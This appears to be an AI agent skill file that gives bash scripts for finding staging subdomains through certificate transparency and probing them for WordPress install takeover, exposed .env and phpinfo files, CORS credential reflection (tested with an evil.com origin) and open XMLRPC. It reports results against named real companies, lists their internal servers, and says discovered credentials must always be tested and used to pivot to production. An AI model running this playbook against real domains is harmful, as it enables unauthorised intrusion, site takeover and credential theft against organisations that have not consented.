---
name: staging-subdomain-hunt
description: Hunt staging via crt.sh when production is WAF-hardened.
version: 1.0.0
author: uphiago
license: MIT
platforms: [linux]
compatibility: Requires agentiko worker (curl, nmap, python3, masscan, subfinder, httpx, nuclei)
metadata:
  hermes:
    tags: [recon, subdomain, staging, takeover, wordpress]
    category: recon
    related_skills:
      - wp-mass-recon
      - deep-invade
      - subdomain-enumeration
      - wordpress-plugin-hunt
      - js-secrets-extraction
      - source-leak-hunt
      - phpinfo-to-rce
---

# Staging & Subdomain Hunt Skill

Discover staging, development, and internal subdomains through certificate transparency (crt.sh), DNS brute force, and web probing. Exploit the staging security gap — staging environments consistently have weaker security than production (no WAF, debug enabled, install pages accessible). Proven on 7 US targets where staging subdomains exposed phpinfo, WordPress install pages, and internal APIs not visible on production.

## When to Use

- Running `deep-invade` Phase 5 on a high-value target.
- Production target is well-secured (WAF, no leaks) — pivot to staging.
- Target has a large attack surface (e-commerce, SaaS, franchise model).
- You need additional entry points when the main site is hardened.
- After `subdomain-enumeration` produces a list of subdomains.

## Prerequisites

- `terminal` tool with curl, httpx, jq.
- Target domain (e.g., `example.com`).
- For DNS brute force: wordlist at `/root/tools/subdomains.txt`.

## How to Run

```bash
DOMAIN="example.com"

# crt.sh discovery
curl -sk "https://crt.sh/?q=%25.$DOMAIN&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u > subs.txt

# Probe for live hosts
httpx -silent -l subs.txt -threads 50 -status-code -tech-detect -o alive_subs.txt

# Check for staging indicators
grep -iE 'staging|stage|dev|test|uat|beta' alive_subs.txt
```

## Quick Reference

| Indicator | What It Means | Action |
|-----------|---------------|--------|
| `/wp-admin/install.php` returns 200 | Fresh WordPress — no site configured | Install takeover |
| `/wp-admin/upgrade.php` returns 200 | WP needs DB upgrade | DB info disclosure |
| `info.php` / `phpinfo.php` on staging | Debug enabled | PHPInfo analysis (see phpinfo-to-rce) |
| Staging has no Cloudflare/WAF | Direct origin access | Run full deep-invade on origin IP |
| CORS on staging but not production | Staging has weaker CORS policy | CORS attack from staging context |
| `.env` on staging | Dev credentials exposed | Credential theft, pivot to production |

## Procedure

### Step 1 — Certificate Transparency Enumeration

```bash
DOMAIN="$1"
OUTDIR="/root/output/staging/$DOMAIN"
mkdir -p "$OUTDIR"

echo "[*] crt.sh enumeration for *.$DOMAIN"

# Primary crt.sh query
curl -sk --max-time 30 "https://crt.sh/?q=%25.$DOMAIN&output=json" 2>/dev/null | \
  jq -r '.[].name_value' 2>/dev/null | sed 's/\*\.//g' | sed 's/^www\.//' | sort -u > "$OUTDIR/crtsh_subs.txt"

# Also try without wildcard prefix
curl -sk --max-time 30 "https://crt.sh/?q=$DOMAIN&output=json" 2>/dev/null | \
  jq -r '.[].name_value' 2>/dev/null | sed 's/\*\.//g' | sed 's/^www\.//' | sort -u >> "$OUTDIR/crtsh_subs.txt"

sort -u "$OUTDIR/crtsh_subs.txt" -o "$OUTDIR/crtsh_subs.txt"

sub_count=$(wc -l < "$OUTDIR/crtsh_subs.txt")
echo "[+] crt.sh: $sub_count unique subdomains"

# Categorize by pattern
echo ""
echo "[*] Staging/dev subdomains:"
grep -iE 'staging|stage|dev\.|development|test|uat|beta|sandbox|demo|preview|qa' "$OUTDIR/crtsh_subs.txt"

echo ""
echo "[*] Admin/internal subdomains:"
grep -iE 'admin|portal|internal|dashboard|manage|cp\.|control|panel|cpanel|webmail|mail\.' "$OUTDIR/crtsh_subs.txt"

echo ""
echo "[*] API subdomains:"
grep -iE 'api|rest|graphql|ws\.|websocket' "$OUTDIR/crtsh_subs.txt"

echo ""
echo "[*] Infrastructure subdomains:"
grep -iE 'cdn|static|assets|media|img|images|files|download|origin|proxy' "$OUTDIR/crtsh_subs.txt"

echo ""
echo "[*] Franchise/location subdomains:"
grep -iE 'franchise|location|store|shop|branch|office' "$OUTDIR/crtsh_subs.txt"
```

### Step 2 — Live Host Discovery

```bash
DOMAIN="$1"
OUTDIR="/root/output/staging/$DOMAIN"

echo "[*] Probing $(wc -l < "$OUTDIR/crtsh_subs.txt") subdomains..."

httpx -silent -l "$OUTDIR/crtsh_subs.txt" -threads 50 -status-code -tech-detect -title \
  -o "$OUTDIR/alive_subs.txt"

alive=$(wc -l < "$OUTDIR/alive_subs.txt")
echo "[+] $alive live hosts"

# Prioritize staging/dev
echo ""
echo "[*] Staging/dev LIVE:"
grep -iE 'staging|stage|dev\.|development|test|uat' "$OUTDIR/alive_subs.txt" | head -20
```

### Step 3 — WordPress Install Page Check (Staging Takeover)

Staging sites frequently have WordPress installed but not configured:

```bash
DOMAIN="$1"
OUTDIR="/root/output/staging/$DOMAIN"

echo "[*] Checking for WordPress install pages on staging..."

for sub in $(grep -iE 'staging|stage|dev' "$OUTDIR/alive_subs.txt" | awk '{print $1}' | head -10); do
  echo "--- $sub ---"

  # Check install.php (fresh WP, no config)
  install_code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 10 "$sub/wp-admin/install.php")
  if [[ "$install_code" == "200" ]]; then
    echo "  [TAKEOVER] /wp-admin/install.php — fresh WP install, can configure site!"
    # Extract form fields
    curl -sk --max-time 10 "$sub/wp-admin/install.php" | grep -oP 'name="[^"]+"' | sort -u
  fi

  # Check upgrade.php (needs DB upgrade)
  upgrade_code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 10 "$sub/wp-admin/upgrade.php")
  if [[ "$upgrade_code" == "200" ]]; then
    echo "  [INFO] /wp-admin/upgrade.php — DB upgrade page accessible"
  fi

  # Check setup-config.php (no wp-config)
  config_code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 10 "$sub/wp-admin/setup-config.php")
  if [[ "$config_code" == "200" || "$config_code" == "409" ]]; then
    echo "  [INFO] /wp-admin/setup-config.php — wp-config missing or accessible"
  fi

  # Check for exposed info.php
  info_code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 "$sub/info.php")
  [[ "$info_code" == "200" ]] && echo "  [CRITICAL] /info.php exposed on staging!"

  # Check for .env on staging
  env_code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 "$sub/.env")
  [[ "$env_code" == "200" ]] && echo "  [CRITICAL] /.env exposed on staging!"
done
```

### Step 4 — Production vs Staging Security Gap Analysis

```bash
DOMAIN="$1"
PROD="https://$DOMAIN"
STAGING=$(grep -iE 'staging|stage' "/root/output/staging/$DOMAIN/alive_subs.txt" | head -1 | awk '{print $1}')

if [[ -n "$STAGING" ]]; then
  echo "[*] Comparing $PROD vs $STAGING"

  # Compare HTTP headers
  echo "=== Production Headers ==="
  curl -skI "$PROD" 2>/dev/null | head -20

  echo ""
  echo "=== Staging Headers ==="
  curl -skI "$STAGING" 2>/dev/null | head -20

  # Check for common staging weaknesses
  echo ""
  echo "[*] Staging-specific checks:"

  # Directory listing
  listing=$(curl -sk --max-time 5 "$STAGING/wp-content/uploads/" | grep -i "Index of")
  [[ -n "$listing" ]] && echo "  [WEAK] Directory listing enabled on uploads"

  # Debug mode
  debug=$(curl -sk --max-time 5 "$STAGING/" | grep -i "wp_debug\|debug mode\|error_reporting")
  [[ -n "$debug" ]] && echo "  [WEAK] Debug output visible"

  # CORS on staging
  cors=$(curl -skI --max-time 5 "$STAGING/wp-json/wp/v2/users" -H "Origin: https://evil.com" | grep -i "access-control-allow-credentials: true")
  [[ -n "$cors" ]] && echo "  [WEAK] CORS credential reflection on staging"

  # XMLRPC on staging
  xmlrpc=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 -X POST "$STAGING/xmlrpc.php" \
    -d '<?xml version="1.0"?><methodCall><methodName>demo.sayHello</methodName></methodCall>')
  [[ "$xmlrpc" == "200" ]] && echo "  [WEAK] XMLRPC open on staging"
fi
```

### Step 5 — Franchise/Multi-Location Subdomain Enumeration

For franchise or multi-location businesses:

```bash
DOMAIN="$1"
OUTDIR="/root/output/staging/$DOMAIN"

echo "[*] Franchise/location subdomains:"

# Extract location-based subdomains
grep -iE 'franchise|location|store|shop|branch|office|city|state' "$OUTDIR/alive_subs.txt" | while read -r line; do
  sub=$(echo "$line" | awk '{print $1}')
  echo "--- $sub ---"

  # Check if it's a WordPress site
  wp=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 "$sub/wp-login.php")
  [[ "$wp" =~ ^(200|301|302)$ ]] && echo "  WordPress detected"

  # Check for WPSL (WP Store Locator) data
  wpsl=$(curl -sk "$sub/wp-json/wpsl/v1/" 2>/dev/null | python3 -c "import sys,json; d=json.load(sys.stdin); print(len(d) if isinstance(d,list) else 'no')" 2>/dev/null)
  [[ "$wpsl" != "no" && "$wpsl" != "0" ]] && echo "  WPSL: $wpsl locations"

  # Check for store-specific data
  users=$(curl -sk "$sub/wp-json/wp/v2/users" 2>/dev/null | python3 -c "import sys,json; d=json.load(sys.stdin); print(len(d) if isinstance(d,list) else 0)" 2>/dev/null)
  [[ "$users" -gt 0 ]] && echo "  Users: $users"
done
```

## Pitfalls

- **crt.sh rate limiting.** crt.sh may return empty JSON if rate-limited. Use 2-3s delays between queries or query the PostgreSQL dump directly at `crt.sh/?d=`.
- **Wildcard certs hide subdomains.** If `*.example.com` is the only cert, individual subdomains won't appear in crt.sh. Use subfinder DNS brute force as fallback.
- **Staging may require VPN.** Some staging environments are IP-restricted. Try from the worker IP, then from a residential proxy.
- **WordPress install.php on production.** Some poorly maintained production sites also have this accessible. It's not always staging-specific. Check for "Welcome to WordPress" title text to confirm it's a fresh install.
- **CORS on staging but not production is common.** Wave9 discovered CORS on restonic.com and toolking.com that was MISSED in waves 6-8 because it was only tested on certain endpoints. Always test the full CORS matrix (10+ endpoints) on both production AND staging.

## Wave9 Production Results — Massive Internal Subdomain Leaks

### biglots.com — 20+ internal subdomains leaked via crt.sh
```
sftp.biglots.com      — SFTP server
blctx.biglots.com     — internal system
eac.biglots.com       — Exchange Admin Center
jss.biglots.com       — Jamf MDM
vwsip.biglots.com     — internal service
731277-controller1    — infrastructure controller
alweb.rfk.biglots.com — internal app server
mobilebiqa            — mobile BI QA
mta.em.biglots.com    — email transport
goedgertr02           — internal server
agents03              — agent/management system
smetrics              — analytics
help.biglots.com      — helpdesk
blcbusexpw02          — business system
```

None of these were publicly known before crt.sh enumeration. Certificate transparency is the #1 source for internal infrastructure discovery.

### realpro.com — Exchange + VPN + SSH surfaced via crt.sh
```
owa.realpro.com       — Outlook Web Access (Exchange)
srvexch01/srvexch02   — Exchange servers
vpn.realpro.com       — VPN portal
remote.realpro.com    — Remote access
link.realpro.com      — SMTP2GO dashboard (LIVE)
portal.realpro.com    — Internal portal
install.realpro.com   — Installer portal
```

## Verification

- Every staging subdomain MUST be probed with httpx to confirm it's live.
- WordPress install.php MUST return HTTP 200 with "WordPress" + "installation" in body (not a redirect or SPA).
- Staging weakness MUST be compared against production to confirm a security gap (e.g., production has WAF but staging doesn't).
- Internal subdomain leaks from crt.sh must be verified to be the target's infrastructure (not unrelated domains in the same cert).
- All discovered staging credentials/config MUST be tested for validity (don't assume staging creds work on production, but always test).
